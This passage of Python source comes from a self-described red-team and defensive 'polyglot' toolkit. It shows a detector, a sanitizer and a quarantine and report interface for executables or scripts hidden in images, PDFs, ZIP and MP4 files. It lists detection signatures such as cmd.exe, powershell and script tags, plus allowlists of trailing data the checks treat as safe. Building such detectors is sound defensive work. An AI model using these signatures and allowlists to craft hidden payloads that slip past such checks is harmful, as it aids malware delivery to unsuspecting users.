                    '.php', '.asp', '.aspx', '.jsp', '.vue', '.svelte', '.rb', '.pl',
                    '.sh', '.bash', '.zsh', '.ps1', '.bat', '.cmd', '.vbs', '.lua',
                    '.md', '.txt', '.rst', '.csv', '.json', '.xml', '.yaml', '.yml',
                    '.toml', '.ini', '.cfg', '.conf', '.log', '.sql', '.r', '.R',
                    '.java', '.c', '.cpp', '.h', '.hpp', '.cs', '.go', '.rs', '.swift',
                    '.kt', '.scala', '.ex', '.exs', '.erl', '.hs', '.ml', '.clj',
                    # ML model files — binary, will always have false positive sigs
                    '.cbm', '.onnx', '.bin', '.model', '.pkl', '.pt', '.pth', '.gguf',
                    '.h5', '.pb', '.tflite', '.safetensors', '.joblib',
                    # Compiled/shared libraries
                    '.so', '.dll', '.dylib', '.a', '.lib', '.o', '.obj',
                    # Databases
                    '.db', '.sqlite', '.sqlite3', '.mdb',
                    # Fonts
                    '.ttf', '.otf', '.woff', '.woff2',
                    # Compiled bytecode
                    '.pyc', '.pyo', '.class', '.wasm'}

        # Script patterns — only check in TRAILING data, not entire file
        SCRIPT_SIGS = {
            'SCRIPT': b'<script', 'HTA': b'<hta:', 'HTA2': b'<HTA:',
            'VBS': b'CreateObject', 'JSCRIPT': b'function(',
            'CMD': b'cmd.exe', 'PS1': b'powershell', 'WSF': b'<job',
            'PYTHON': b'#!/usr/bin/env python', 'APPLESCRIPT': b'osascript',
        }
        # Executable patterns — check anywhere but validate headers
        # NOTE: LNK removed — \x4c\x00\x00\x00 is too common in binary files (false positives)
        EXE_SIGS = {
            'PE/EXE': b'MZ', 'ELF': b'\x7fELF',
            'CLASS': b'\xca\xfe\xba\xbe', 'MACHO': b'\xfe\xed\xfa',
        }
        # Non-exe patterns safe to check anywhere
        OTHER_SIGS = {
            'PDF': b'%PDF', 'ZIP': b'PK', 'RAR': b'Rar!',
            '7Z': b'\x37\x7a\xbc\xaf', 'GZIP': b'\x1f\x8b',
            'BAT': b'@echo', 'SH': b'#!/bin/',
        }

        # Get trailing data region (after end marker)
        trailing_start = len(data)  # default: no trailing region
        markers = {'JPEG':(b'\xff\xd9',2,64),'PNG':(b'IEND',8,64),
                   'GIF':(b'\x3b',1,64),'PDF':(b'%%EOF',5,0)}
        if ct in markers:
            m, extra, _ = markers[ct]
            pos = data.rfind(m)
            if pos != -1:
                trailing_start = pos + extra
        elif ct == 'ZIP':
            eocd = data.rfind(b'PK\x05\x06')
            if eocd != -1:
                comment_len = 0
                if eocd + 22 <= len(data):
                    comment_len = struct.unpack('<H', data[eocd+20:eocd+22])[0]
                trailing_start = eocd + 22 + comment_len

        # 1. Check EXE sigs anywhere (with validation)
        for name, sig in EXE_SIGS.items():
            off = data.find(sig, 64)
            if off != -1 and ext not in SAFE_EXT:
                is_valid = False
                if sig == b'MZ':
                    is_valid = self._validate_pe(data, off)
                elif sig == b'\x7fELF':
                    is_valid = self._validate_elf(data, off)
                elif sig == b'\xca\xfe\xba\xbe':
                    # Java CLASS — validate: major version 45-67, minor 0-65535
                    is_valid = (off + 8 <= len(data) and
                                45 <= struct.unpack_from('>H', data, off+6)[0] <= 67)
                elif sig == b'\xfe\xed\xfa':
                    # Mach-O — validate: magic + cputype check
                    is_valid = (off + 12 <= len(data) and
                                struct.unpack_from('<I', data, off)[0] in (0xFEEDFACF, 0xFEEDFACE))
                else:
                    is_valid = False  # Unknown sig — don't flag
                if is_valid:
                    findings.append({'type':'HIDDEN_SIG','detail':f'{name} @ 0x{off:X}',
                        'severity':'critical','offset':off})

        # 2. Check script sigs ONLY in trailing data
        if trailing_start < len(data) and ext not in SAFE_EXT:
            trailing = data[trailing_start:]
            for name, sig in SCRIPT_SIGS.items():
                off = trailing.find(sig)
                if off != -1:
                    sev = 'critical' if name in ('SCRIPT','HTA','HTA2','VBS','JSCRIPT','CMD','PS1') else 'warning'
                    findings.append({'type':'HIDDEN_SIG','detail':f'{name} @ 0x{trailing_start+off:X}',
                        'severity':sev,'offset':trailing_start+off})

        # 3. Check other sigs anywhere (format confusion)
        for name, sig in OTHER_SIGS.items():
            off = data.find(sig, 64)
            if off != -1 and ext not in SAFE_EXT:
                findings.append({'type':'HIDDEN_SIG','detail':f'{name} @ 0x{off:X}',
                    'severity':'warning','offset':off})

        # Per-format: (end_marker, extra_bytes, min_search_offset)
        # PDF %%EOF can appear very early in small files, so use offset 0
        markers = {'JPEG':(b'\xff\xd9',2,64),'PNG':(b'IEND',8,64),
                   'GIF':(b'\x3b',1,64),'PDF':(b'%%EOF',5,0)}
        if ct in markers:
            m, extra, min_off = markers[ct]
            pos = data.rfind(m)
            if pos != -1 and pos+extra <= len(data):
                trailing = data[pos+extra:]
                # Check if trailing data is safe metadata (not a polyglot payload)
                if not self._is_safe_trailing(ext, ct, trailing):
                    t = len(trailing)
                    findings.append({'type':'TRAILING_DATA',
                        'detail':f'{t:,} bytes after {ct} end — hidden payload',
                        'severity':'critical','offset':pos+extra})

        # ZIP: check for trailing data after EOCD (PK\x05\x06)
        if ct == 'ZIP':
            eocd = data.rfind(b'PK\x05\x06')
            if eocd != -1:
                # EOCD is 22 bytes minimum, but may have a comment
                comment_len = 0
                if eocd + 22 <= len(data):
                    comment_len = struct.unpack('<H', data[eocd+20:eocd+22])[0]
                zip_end = eocd + 22 + comment_len
                if zip_end < len(data):
                    trailing = data[zip_end:]
                    t = len(trailing)
                    if t > 16 and not self._is_safe_trailing(ext, ct, trailing):
                        findings.append({'type':'TRAILING_DATA',
                            'detail':f'{t:,} bytes after ZIP EOCD — hidden payload',
                            'severity':'critical','offset':zip_end})

        # MP4: check for trailing data after last valid atom
        if ct == 'MP4':
            mp4_end = self._find_mp4_end(data)
            if mp4_end > 0 and mp4_end < len(data):
                trailing = data[mp4_end:]
                t = len(trailing)
                if t > 16:
                    findings.append({'type':'TRAILING_DATA',
                        'detail':f'{t:,} bytes after MP4 moov atom — hidden payload',
                        'severity':'critical','offset':mp4_end})

        # PE/ELF/Mach-O overlay detection: executable at start, image in overlay
        # This is the classic polyglot technique: OS ignores overlay, image viewers find image
        if ct in ('PE', 'ELF'):
            IMAGE_SIGS = {
                'JPEG': b'\xff\xd8\xff',
                'PNG': b'\x89PNG\r\n\x1a\n',
                'GIF87a': b'GIF87a',
                'GIF89a': b'GIF89a',
            }
            for img_name, img_sig in IMAGE_SIGS.items():
                # Search for image signature after the first 1KB (past headers)
                img_off = data.find(img_sig, 1024)
                if img_off != -1:
                    findings.append({'type':'OVERLAY_POLYGLOT',
                        'detail':f'{ct}+{img_name} overlay: executable at 0x0, {img_name} image @ 0x{img_off:X} ({len(data)-img_off:,} bytes)',
                        'severity':'critical','offset':img_off})

        # Mach-O overlay detection
        if data[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
                        b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe'):
            IMAGE_SIGS = {
                'JPEG': b'\xff\xd8\xff',
                'PNG': b'\x89PNG\r\n\x1a\n',
                'GIF87a': b'GIF87a',
                'GIF89a': b'GIF89a',
            }
            for img_name, img_sig in IMAGE_SIGS.items():
                img_off = data.find(img_sig, 1024)
                if img_off != -1:
                    findings.append({'type':'OVERLAY_POLYGLOT',
                        'detail':f'Mach-O+{img_name} overlay: executable at 0x0, {img_name} image @ 0x{img_off:X} ({len(data)-img_off:,} bytes)',
                        'severity':'critical','offset':img_off})

        # Image overlay detection: image at start, executable in trailing data
        if ct in ('JPEG', 'PNG', 'GIF') and trailing_start < len(data):
            trailing = data[trailing_start:]
            EXE_OVERLAY_SIGS = {
                'PE/EXE': b'MZ',
                'ELF': b'\x7fELF',
                'Mach-O': b'\xfe\xed\xfa',
            }
            for exe_name, exe_sig in EXE_OVERLAY_SIGS.items():
                exe_off = trailing.find(exe_sig)
                if exe_off != -1:
                    # VALIDATE the signature — don't match random bytes
                    if exe_name == 'PE/EXE' and not self._validate_pe(trailing, exe_off):
                        continue
                    if exe_name == 'ELF' and not self._validate_elf(trailing, exe_off):
                        continue
                    findings.append({'type':'OVERLAY_POLYGLOT',
                        'detail':f'{ct}+{exe_name} overlay: image at 0x0, {exe_name} @ 0x{trailing_start+exe_off:X} ({len(trailing)-exe_off:,} bytes)',
                        'severity':'critical','offset':trailing_start+exe_off})

        ss = max(len(data)//8, 1)
        for i in range(8):
            s = data[i*ss:(i+1)*ss]
            if len(s) < 100: continue
            e = self.entropy(s)
            if e > 7.5:
                findings.append({'type':'HIGH_ENTROPY',
                    'detail':f'Section {i+1}/8: {e:.2f}','severity':'info','offset':i*ss})

        if data[:4]==b'%PDF' and data.find(b'MZ',100)!=-1:
            mz_off = data.find(b'MZ',100)
            if self._validate_pe(data, mz_off):
                findings.append({'type':'MIME_CONFUSION',
                    'detail':'PDF+PE — MIME confusion','severity':'critical','offset':mz_off})
        if data[:2]==b'\xff\xd8' and data.find(b'PK',100)!=-1:
            pk_off = data.find(b'PK',100)
            # Validate PK is a real ZIP local file header (PK\x03\x04) or EOCD (PK\x05\x06)
            if pk_off + 4 <= len(data) and data[pk_off:pk_off+4] in (b'PK\x03\x04', b'PK\x05\x06', b'PK\x01\x02'):
                findings.append({'type':'MIME_CONFUSION',
                    'detail':'JPEG+ZIP — MIME confusion','severity':'critical','offset':pk_off})
        # HTML/Script in non-HTML files = active payload
        if ct in ('HTML',) and ext not in ('.html','.htm','.php','.xhtml','.svg'):
            findings.append({'type':'MIME_CONFUSION',
                'detail':f'HTML content in {ext} file — executable payload','severity':'critical','offset':0})

        return findings

    def _validate_pe(self, data: bytes, pos: int) -> bool:
        """Validate that MZ at pos is a real PE header."""
        try:
            if pos + 64 > len(data): return False
            e_lfanew = struct.unpack_from('<I', data, pos + 60)[0]
            pe_pos = pos + e_lfanew
            if pe_pos + 4 > len(data): return False
            return data[pe_pos:pe_pos+4] == b'PE\x00\x00'
        except: return False

    def _validate_elf(self, data: bytes, pos: int) -> bool:
        """Validate that ELF at pos has valid header."""
        try:
            if pos + 20 > len(data): return False
            if data[pos+4] not in (1, 2): return False
            if data[pos+5] not in (1, 2): return False
            elf_type = struct.unpack_from('<H' if data[pos+5]==1 else '>H', data, pos+16)[0]
            return elf_type in (1, 2, 3, 4)
        except: return False

    def _find_mp4_end(self, data: bytes) -> int:
        """Find the end of valid MP4 atoms. Returns offset of trailing data."""
        offset = 0
        last_valid = 0
        # Top-level MP4 atom types
        known_atoms = {b'ftyp', b'moov', b'mdat', b'free', b'edts',
                       b'mdat', b'wide', b'skip', b'udta', b'pdin',
                       b'mvhd', b'trak', b'uuid', b'ftyp'}
        while offset + 8 <= len(data):
            try:
                size = struct.unpack('>I', data[offset:offset+4])[0]
                atom_type = data[offset+4:offset+8]
                if size < 8 or offset + size > len(data):
                    break
                if atom_type in known_atoms or atom_type.isalpha():
                    last_valid = offset + size
                    offset += size
                else:
                    break
            except Exception:
                break
        return last_valid

    def _is_safe_trailing(self, ext, ct, trailing):
        """Check if trailing data is safe metadata (not a polyglot payload)."""
        safe_patterns = {
            '.pdf': [b'<?xpacket', b'<x:xmpmeta', b'%AI12_PaperData',
                     b'\x00' * 8, b'%%Page', b'startxref'],
            '.png': [b'tEXt', b'zTXt', b'iTXt', b'pHYs', b'tIME',
                     b'cHRM', b'gAMA', b'iCCP', b'sRGB'],
            '.jpg': [b'\xff\xee', b'\xff\xe2', b'ICC_PROFILE'],
            '.gif': [b'NETSCAPE', b'Application'],
        }
        for pat in safe_patterns.get(ext, []):
            if trailing[:len(pat)+20].startswith(pat):
                return True
        # Check RAW bytes for payload signatures BEFORE stripping nulls
        # This catches "MZ\x90\x00..." where stripping reduces to 3 bytes
        PAYLOAD_SIGS = [b'MZ', b'\x7fELF', b'PK', b'%PDF', b'\xff\xd8',
                        b'\x89PNG', b'GIF8', b'Rar!', b'\x37\x7a\xbc\xaf',
                        b'<!doctype', b'<html', b'<script', b'#!/', b'BM']
        raw_prefix = trailing[:32].lower()
        for sig in PAYLOAD_SIGS:
            if raw_prefix[:len(sig)].startswith(sig.lower()):
                return False
        # Also safe if it's only whitespace/nulls (< 64 bytes)
        stripped = trailing.strip(b'\x00\r\n\t ')
        if len(stripped) < 16:
            return True
        return False


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    # Patterns that are SAFE trailing data (not polyglot payloads)
    SAFE_TRAILING = {
        '.pdf': [
            b'<?xpacket',          # Adobe/Canva XMP metadata
            b'<x:xmpmeta',         # XMP metadata block
            b'%AI12_PaperData',    # Adobe Illustrator
            b'\x00' * 8,           # PDF padding (common in Canva exports)
            b'%%Page',             # PostScript trailer
            b'startxref',          # Incremental save
        ],
        '.png': [
            b'tEXt',               # PNG text metadata
            b'zTXt',               # Compressed text metadata
            b'iTXt',               # International text metadata
            b'pHYs',               # Physical pixel dimensions
            b'tIME',               # Last modification time
            b'cHRM',               # Chromaticity
            b'gAMA',               # Gamma
            b'iCCP',               # ICC color profile
            b'sRGB',               # sRGB color space
        ],
        '.jpg': [
            b'\xff\xee',           # Adobe APP14 marker
            b'\xff\xe2',           # APP2 (ICC profile)
            b'ICC_PROFILE',        # ICC color profile
        ],
        '.gif': [
            b'NETSCAPE',           # GIF animation extension
            b'Application',        # GIF application extension
        ],
    }

    PAYLOAD_SIGS = [b'MZ', b'\x7fELF', b'PK', b'%PDF', b'\xff\xd8',
                     b'\x89PNG', b'GIF8', b'Rar!', b'\x37\x7a\xbc\xaf',
                     b'<!doctype', b'<html', b'<script', b'#!/', b'BM',
                     b'\xca\xfe\xba\xbe', b'\xfe\xed\xfa', b'\x4c\x00\x00\x00']

    def _is_safe_trailing(self, ext, trailing_data):
        """Check if trailing data is a known benign pattern (not a polyglot payload)."""
        # Empty or trivially small trailing data is safe
        if len(trailing_data) < 2:
            return True
        # Check SAFE_TRAILING patterns first (known benign metadata)
        patterns = self.SAFE_TRAILING.get(ext, [])
        for pat in patterns:
            if trailing_data[:len(pat)+20].startswith(pat):
                return True
        # Check RAW bytes for payload signatures BEFORE stripping nulls
        # This catches "MZ\x90\x00..." where stripping would reduce "MZ\x90" to 3 bytes
        raw_prefix = trailing_data[:32].lower()
        for sig in self.PAYLOAD_SIGS:
            if raw_prefix[:len(sig)].startswith(sig.lower()):
                return False
        # If trailing data is ONLY whitespace/nulls, it's safe
        stripped = trailing_data.strip(b'\x00\r\n\t ')
        if len(stripped) < 4:
            return True
        return False

    def _find_mp4_end(self, data: bytes) -> int:
        """Find the end of valid MP4 atoms. Returns offset of trailing data."""
        import struct as _struct
        offset = 0
        last_valid = 0
        known_atoms = {b'ftyp', b'moov', b'mdat', b'free', b'edts',
                       b'wide', b'skip', b'udta', b'pdin', b'uuid'}
        while offset + 8 <= len(data):
            try:
                size = _struct.unpack('>I', data[offset:offset+4])[0]
                atom_type = data[offset+4:offset+8]
                if size < 8 or offset + size > len(data):
                    break
                if atom_type in known_atoms or atom_type.isalpha():
                    last_valid = offset + size
                    offset += size
                else:
                    break
            except Exception:
                break
        return last_valid

    def sanitize(self, filepath, backup=True):
        with open(filepath, 'rb') as f:
            data = f.read()
        orig = len(data)
        ext = os.path.splitext(filepath)[1].lower()
        cleaned = None
        detected = None

        # Detect content type (handles leading whitespace/padding)
        stripped = data.lstrip()
        ct = None
        if stripped[:2]==b'\xff\xd8': ct='JPEG'
        elif stripped[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif stripped[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif stripped[:4]==b'%PDF': ct='PDF'
        elif stripped[:2]==b'PK': ct='ZIP'
        elif stripped[:2]==b'MZ': ct='PE'
        elif stripped[:4]==b'\x7fELF': ct='ELF'
        elif stripped[:15].lower().startswith((b'<!doctype',b'<html',b'<?php',b'<?xml',b'<%')): ct='HTML'
        elif b'ftyp' in stripped[:20]: ct='MP4'

        # Extension/content mismatch — file is disguised, can't auto-sanitize
        ext_map = {'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
                   '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4'}
        expected = ext_map.get(ext)
        if expected and ct and expected != ct:
            return {'status':'danger',
                    'detail':f'POLYGLOT: {ext} file contains {ct} content — cannot auto-sanitize, recommend quarantine',
                    'removed':0,'content_type':ct,'expected_type':expected}

        # handlers: exts -> (name, end_marker, extra_bytes, min_offset)
        handlers = {('.jpg','.jpeg'):('JPEG',b'\xff\xd9',2,64),('.png',):('PNG',b'IEND',8,64),
                    ('.gif',):('GIF',b'\x3b',1,64),('.pdf',):('PDF',b'%%EOF',5,0)}
        for exts,(name,m,extra,min_off) in handlers.items():
            if ext in exts or (ct and ct == name):
                # Use rfind (last occurrence) — polyglot payloads may
                # contain end markers; find would cut at the wrong one
                pos = data.rfind(m)
                if pos!=-1 and pos+extra<=len(data):
                    trailing = data[pos+extra:]
                    # Check if trailing data is safe (metadata, not payload)
                    if self._is_safe_trailing(ext, trailing):
                        return {'status':'clean','detail':f'{name}: safe trailing metadata ({len(trailing):,} bytes)',
                                'removed':0,'safe_metadata':True}
                    cleaned = data[:pos+extra]; detected = name
                break

        if ext=='.zip' or data[:2]==b'PK':
            eocd = data.rfind(b'\x50\x4b\x05\x06')
            if eocd!=-1 and eocd+22<len(data):
                cleaned = data[:eocd+22]; detected = 'ZIP'

        # MP4: strip trailing data after last valid atom
        if ext=='.mp4' or ct=='MP4':
            mp4_end = self._find_mp4_end(data)
            if mp4_end > 0 and mp4_end < len(data):
                trailing = data[mp4_end:]
                if len(trailing) > 16:
                    cleaned = data[:mp4_end]; detected = 'MP4'

        if cleaned is None or len(cleaned)>=orig:
            return {'status':'clean','detail':f'{detected or "Unknown"}: clean','removed':0}

        if backup: shutil.copy2(filepath, filepath+'.bak')
        with open(filepath,'wb') as f: f.write(cleaned)
        return {'status':'sanitized','detail':f'{detected}: {orig-len(cleaned):,} bytes removed',
                'removed':orig-len(cleaned),'backup':filepath+'.bak' if backup else None}


# ── TUI Application ─────────────────────────────────────────

BANNER_V3 = """
[red]╔══════════════════════════════════════════════════════════════╗[/red]
[red]║[/red]  [bold white]◆ POLYGLOT TOOLKIT v3.0[/bold white]                                [red]║[/red]
[red]║[/red]  [dim]Red Team + Shield Edition[/dim]                                [red]║[/red]
[red]║[/red]  [dim]Author: Mr-DS-ML-85[/dim]                                      [red]║[/red]
[red]╚══════════════════════════════════════════════════════════════╝[/red]"""

DISCLAIMER_TUI = "[bold yellow]⚠  FOR EDUCATIONAL & AUTHORIZED TESTING ONLY[/bold yellow]"


class PolyglotTUI:
    def __init__(self):
        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.stats = {'scanned':0,'threats':0,'sanitized':0,'built':0}
        self.alerts = deque(maxlen=50)
        if HAS_QUARANTINE:
            self.quarantine_mgr = QuarantineManager(quarantine_dir=os.path.expanduser("~/.polyglot/quarantine"))
        else:
            self.quarantine_mgr = None

    def safe_input(self, prompt_text, default=None, choices=None):
        """Input with KeyboardInterrupt handling."""
        try:
            if choices:
                return Prompt.ask(prompt_text, choices=choices, default=default)
            else:
                return Prompt.ask(prompt_text, default=default)
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Cancelled.[/dim]")
            return None

    def safe_confirm(self, prompt_text, default=True):
        """Confirm with KeyboardInterrupt handling."""
        try:
            return Confirm.ask(prompt_text, default=default)
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Cancelled.[/dim]")
            return None

    def _findings_to_scan_result(self, filepath, findings):
        """Convert PolyglotDetector findings to QuarantineManager scan_result format."""
        sev_map = {'critical': 95, 'high': 80, 'warning': 50, 'info': 20, 'error': 0}
        max_sev = max((sev_map.get(f.get('severity', 'info'), 0) for f in findings), default=0)
        max_sev_name = 'CRITICAL' if max_sev >= 90 else 'HIGH' if max_sev >= 70 else 'MEDIUM' if max_sev >= 40 else 'LOW'
        # Pick the highest-severity finding's type as the primary label (not random set order)
        sorted_findings = sorted(findings, key=lambda f: sev_map.get(f.get('severity', 'info'), 0), reverse=True)
        primary_label = sorted_findings[0].get('type', 'UNKNOWN') if sorted_findings else 'UNKNOWN'
        types = list({f.get('type', 'UNKNOWN') for f in findings})
        return {
            'label': primary_label,
            'confidence': max_sev / 100.0,
            'risk_score': float(max_sev),
            'risk_level': max_sev_name,
            'yara_matches': [],
            'detected_types': types,
        }

    def menu_quarantine(self):
        """Quarantine management — list, restore, delete quarantined files."""
        console.print()
        if not self.quarantine_mgr:
            console.print("[red]✗ Quarantine module not available (engines/quarantine.py missing)[/red]")
            return
        console.print(Panel("[bold red]🔒 QUARANTINE VAULT[/bold red]", border_style="red"))
        stats = self.quarantine_mgr.get_stats()
        console.print(f"  [dim]Vault: {stats['vault_path']}[/dim]")
        console.print(f"  [dim]Active: {stats['active_quarantine']} | Restored: {stats['restored']} | Size: {stats['total_size_mb']} MB[/dim]\n")

        console.print("  [cyan]1.[/cyan] List quarantined files")
        console.print("  [cyan]2.[/cyan] Restore file by ID")
        console.print("  [cyan]3.[/cyan] Restore ALL files")
        console.print("  [cyan]4.[/cyan] Delete file permanently")
        console.print("  [cyan]5.[/cyan] Purge expired entries")
        console.print("  [cyan]0.[/cyan] Back\n")

        choice = self.safe_input("[bold cyan]Choice[/bold cyan]", default="0",
                                  choices=["0", "1", "2", "3", "4", "5"])
        if choice is None or choice == "0":
            return

        if choice == "1":
            entries = self.quarantine_mgr.list_quarantined()
            if not entries:
                console.print("[dim]Vault is empty.[/dim]")
                return
            console.print(f"\n  [bold]{len(entries)} quarantined files:[/bold]\n")
            for e in entries:
                ts = e.get('timestamp', '?')[:19]
                name = e.get('original_name', '?')
                qid = e.get('quarantine_id', '?')
                risk = e.get('risk_level', '?')
                conf = e.get('confidence', 0)
                label = e.get('label', '?')
                console.print(f"    [red]{qid}[/red]  {name}  [dim]{ts}[/dim]  "
                              f"[yellow]{risk}[/yellow] {conf:.0%}  [dim]{label}[/dim]")

        elif choice == "2":
            qid = self.safe_input("[bold cyan]Quarantine ID[/bold cyan] (or prefix)")
            if qid:
                dest = self.safe_input("[bold cyan]Restore to[/bold cyan] (empty = original path)", default="")
                result = self.quarantine_mgr.restore(qid, dest if dest else None)
                if result:
                    console.print(f"  [green]✓ Restored to {result}[/green]")
                else:
                    console.print("  [red]✗ Not found or restore failed[/red]")

        elif choice == "3":
            confirm = self.safe_confirm("[bold red]Restore ALL quarantined files?[/bold red]", default=False)
            if confirm:
                restored = self.quarantine_mgr.restore_all()
                console.print(f"  [green]✓ Restored {len(restored)} files[/green]")

        elif choice == "4":
            qid = self.safe_input("[bold cyan]Quarantine ID to DELETE permanently[/bold cyan]")
            if qid:
                confirm = self.safe_confirm(f"[bold red]Permanently delete {qid}?[/bold red]", default=False)
                if confirm:
                    if self.quarantine_mgr.delete(qid):
                        console.print("  [green]✓ Deleted permanently[/green]")
                    else:
                        console.print("  [red]✗ Not found[/red]")

        elif choice == "5":
            purged = self.quarantine_mgr.auto_purge_expired()
            console.print(f"  [green]✓ Purged {purged} expired entries[/green]")

    def banner(self):
        if not HAS_RICH:
            print("Polyglot Toolkit v3.0 — Red Team + Shield Edition")
            return

        console.print(BANNER_V3)
        console.print(f"  {DISCLAIMER_TUI}\n")

    def _safe_menu_call(self, menu_func):
        """Call a menu function in a loop — reuse without going back to home."""
        while True:
            try:
                menu_func()
            except KeyboardInterrupt:
                console.print("\n[dim]Interrupted[/dim]")
            except Exception as e:
                console.print(f"[red]✗ Error: {e}[/red]")

            # After menu returns, let user run again or go back
            again = self.safe_input(
                "[dim]Press [green]Enter[/green] to run again, or [red]q[/red] to go back[/dim]",
                default=""
            )
            if again is not None and again.lower() in ("q", "quit", "back", "0"):
                return

    # ── Comprehensive Report ──────────────────────────────────────

    def menu_report(self):
        """Generate a comprehensive security report using multiple engines."""
        console.print()
        console.print(Panel("[bold white]📊 COMPREHENSIVE SECURITY REPORT[/bold white]", border_style="white"))
        console.print("  Runs all major analysis engines on a target and generates")
        console.print("  a single unified report file.\n")

        target = self.safe_input("[bold cyan]Target file or directory[/bold cyan]")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        # Collect files
        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                    '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4',
                    '.sh','.bash','.py','.rb','.pl','.applescript','.scpt',
                    '.xlsx','.xls','.pptx','.ppt','.rtf','.html','.hta','.wsf',
                    '.7z','.rar','.iso','.elf','.so','.dylib','.macho'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No scannable files found.[/yellow]")
            return

        # Choose which sections to run
        console.print("\n[bold]Sections to include:[/bold]")
        console.print("  1 │ 🔍  File Detector (rule-based + ML)")
        console.print("  2 │ 🛡  File Sanitizer")
        console.print("  3 │ 🔬  Deep Analysis (format, stego, PE, ELF, office, archive)")
        console.print("  4 │ 🌐  Network IOCs (IPs, domains, URLs)")
        console.print("  5 │ 🔵  Blue Side Indicators")
        console.print("  6 │ 🔒  Quarantine Threats")
        console.print("  [green]all[/green] │ Run everything (default)")

        section_choice = self.safe_input(
            "\n[bold]Select sections[/bold] (comma-separated, or 'all')",
            default="all"
        )
        if section_choice is None: return

        run_all = section_choice.strip().lower() == "all"
        sections = set() if run_all else {s.strip() for s in section_choice.split(",")}

        def want(s):
            return run_all or s in sections

        # Report output
        report_dir = os.path.expanduser("~/.polyglot/reports")
        os.makedirs(report_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_name = os.path.basename(os.path.abspath(target))
        report_path = os.path.join(report_dir, f"report_{target_name}_{ts}.txt")
        report_lines = []

        def rpt(line=""):
            report_lines.append(line)

        rpt("=" * 70)
        rpt("  POLYGLOT SHIELD v3.0 — COMPREHENSIVE SECURITY REPORT")
        rpt("=" * 70)
        rpt(f"  Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        rpt(f"  Target    : {os.path.abspath(target)}")
        rpt(f"  Files     : {len(files)}")
        rpt(f"  Sections  : {'ALL' if run_all else ', '.join(sorted(sections))}")
        rpt("=" * 70)
        rpt()

        total_threats = 0
        total_warnings = 0
        total_clean = 0
        all_findings = []  # (filepath, findings_list)
        ioc_ips = set()
        ioc_domains = set()
        ioc_urls = set()
        sanitize_count = 0
        quarantine_count = 0

        # Load ML model if available
        ml_model = None
        try:
            from engines.model import PolyglotModel
            from engines.features import extract_features_from_file
            from pathlib import Path
            mpath = "models/polyglot_shield.cbm"
            if Path(mpath).exists():
                ml_model = PolyglotModel({'task_type': 'CPU'})
                ml_model.load(mpath)
        except Exception:
            pass

        console.print(f"\n[dim]Analyzing {len(files)} files...[/dim]\n")

        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Generating report...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)

                # ── Section 1: File Detector ──
                if want("1"):
                    try:
                        findings = self.detector.scan_file(fpath)
                        self.stats['scanned'] += 1

                        ml_str = ""
                        if ml_model and ml_model.is_loaded:
                            try:
                                feats = extract_features_from_file(fpath)
                                pred = ml_model.predict_single(feats)
                                ml_str = f"  ML: {pred['label']} {pred['risk_score']:.1f}% ({pred['risk_level']})"
                            except Exception:
                                pass

                        if findings:
                            crit = [f for f in findings if f['severity'] in ('critical','high')]
                            if crit:
                                total_threats += len(crit)
                                all_findings.append((fpath, findings))
                                rpt(f"  [!] {fname}")
                                for f in findings:
                                    sev = f['severity']
                                    off = f" @ 0x{f['offset']:X}" if f.get('offset') else ""
                                    rpt(f"      [{sev.upper()}] {f['type']}: {f['detail']}{off}")
                                if ml_str:
                                    rpt(f"      {ml_str}")
                            else:
                                total_warnings += 1
                                rpt(f"  [~] {fname} — minor warnings")
                        else:
                            total_clean += 1
                            rpt(f"  [+] {fname} — clean")
                            if ml_str:
                                rpt(f"      {ml_str}")
                    except Exception as e:
                        rpt(f"  [!] {fname} — scan error: {e}")

                # ── Section 3: Deep Analysis (simplified inline) ──
                if want("3"):
                    try:
                        try:
                            from engines.media_analysis import MediaAnalyzer
                            ma = MediaAnalyzer()
                            result = ma.analyze(fpath)
                            if result.get('hidden_data') or result.get('anomalies'):
                                rpt(f"  [!] {fname} — Media anomalies detected")
                                for a in result.get('anomalies', []):
                                    rpt(f"      Anomaly: {a}")
                                if result.get('hidden_data'):
                                    rpt(f"      Hidden data: {result['hidden_data']} bytes after end marker")
                        except ImportError:
                            pass

                        try:
                            from engines.stego_detection import SteganographyDetector
                            sd = SteganographyDetector()
                            result = sd.analyze(fpath)
                            if result.get('suspected'):
                                rpt(f"  [!] {fname} — Steganography suspected")
                                for clue in result.get('clues', []):
                                    rpt(f"      {clue}")
                        except ImportError:
                            pass
                    except Exception as e:
                        rpt(f"  [!] {fname} — deep analysis error: {e}")

                # ── Section 4: Network IOCs ──
                if want("4"):
                    try:
                        import re
                        with open(fpath, 'rb') as f:
                            data = f.read(65536)
                        text = data.decode('utf-8', errors='ignore')

                        ip_re = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
                        domain_re = re.compile(r'\b([a-zA-Z0-9-]+\.(com|net|org|io|xyz|top|info|biz|ru|cn|tk|ml|ga|cf|gq))\b')
                        url_re = re.compile(r'(https?://[^\s"\'<>]{5,})')

                        for ip in ip_re.findall(text):
                            octets = ip.split('.')
                            if all(0 <= int(o) <= 255 for o in octets):
                                ioc_ips.add(ip)
